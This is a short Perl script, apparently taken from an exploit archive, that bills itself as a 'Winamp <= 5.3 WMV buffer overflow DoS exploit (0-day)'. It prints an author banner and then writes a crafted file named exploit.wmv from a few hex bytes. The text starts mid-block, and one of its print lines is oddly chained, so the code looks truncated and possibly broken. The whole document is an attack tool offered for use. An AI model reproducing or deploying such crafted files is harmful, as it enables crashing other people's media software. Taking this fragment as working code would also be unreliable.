{

    print "\n-----------------------------------\n";

    print "Winamp <= (WMV) 5.3 Buffer Overflow DOS Exploit (0-DAY)\n";

    print "-----------------------------------\n";

    print "\nUniquE-Key{UniquE-Cracker}\n";

    print "UniquE[at]UniquE-Key.ORG\n";

    print "http://UniquE-Key.ORG\n";

    print "\n-----------------------------------\n";

    print "\nExploit Completed!\n";

    print "\n-----------------------------------\n";

}

open(wmv, ">./exploit.wmv");

print wmv "\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00".

print wmv "\x4D\x54\x68\x64";

close(wmv);
